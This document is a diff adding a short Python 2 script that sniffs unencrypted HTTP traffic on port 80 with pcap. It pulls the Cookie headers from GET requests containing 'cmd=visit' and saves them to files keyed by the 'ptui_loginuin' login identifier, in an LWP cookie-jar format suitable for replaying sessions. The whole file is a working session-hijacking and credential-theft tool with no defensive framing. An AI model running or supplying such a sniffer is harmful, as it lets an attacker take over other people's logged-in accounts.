@@ -1,0 +1,40 @@
+#! /usr/bin/python
+
+from BaseHTTPServer import BaseHTTPRequestHandler
+from StringIO import StringIO
+import Cookie
+class HTTPRequest(BaseHTTPRequestHandler):
+	def __init__(self, request_text):
+		self.rfile = StringIO(request_text)
+		self.raw_requestline = self.rfile.readline()
+		self.error_code = self.error_message = None
+		self.parse_request()
+	def send_error(self, code, message):
+		self.error_code = code
+		self.error_message = message
+
+
+
+import pcap, dpkt
+
+cap = pcap.pcap()
+
+cap.setfilter( 'dst port 80' )
+
+for t, pkt in cap:
+	d = dpkt.ethernet.Ethernet( pkt )
+	if not isinstance( d.data.data, dpkt.tcp.TCP) :continue
+	d = d.data.data.data
+	if d.startswith("GET"):
+		if d.find("cmd=visit") == -1 : continue
+		req = HTTPRequest( d )
+		print req.headers["host"], req.path
+		s = ["#LWP-Cookies-2.0"]
+		fname = ""
+		if "cookie" in req.headers :
+			c = Cookie.SimpleCookie( req.headers["cookie"] )
+			for k in c : 
+				if k == "ptui_loginuin" : fname = "cookie-" + c[k].value
+				s.append( 'Set-Cookie3: %s="%s"; path="/"; domain="%s"; path_sped; discard; version=0' % ( k, c[k].value, req.headers["host"] ) )
+			open( fname, "wb").write( "\r\n".join( s ) )
+			print fname
